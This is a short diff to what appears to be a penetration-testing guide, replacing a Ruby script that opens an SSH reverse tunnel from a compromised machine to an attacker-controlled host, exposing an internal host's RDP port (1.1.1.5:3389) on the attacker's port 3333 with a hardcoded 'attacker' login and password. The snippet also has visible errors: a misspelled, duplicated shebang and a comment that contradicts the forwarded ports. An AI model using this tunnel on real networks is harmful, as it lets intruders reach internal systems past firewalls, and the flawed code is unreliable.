@@ -72,8 +72,16 @@ rdesktop WebServer:3333
 
 **ssh-rtunnel.rb**
 ```
-#!/usr/bin/env ruby 
-require 'net/ssh/gateway'
+#!/usr/bin/evn ruby
+#!/usr/bin/evn ruby
+require 'net/ssh'
+
+Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
+  # Forward connections on local port 1234 to port 22 of attacker.zone
+  ssh.forward.remote_to(3389, '1.1.1.5', 3333, '0.0.0.0')
+  puts "[+] Starting SSH forward tunnel"
+  ssh.loop { true }
+end
 
 ```
 
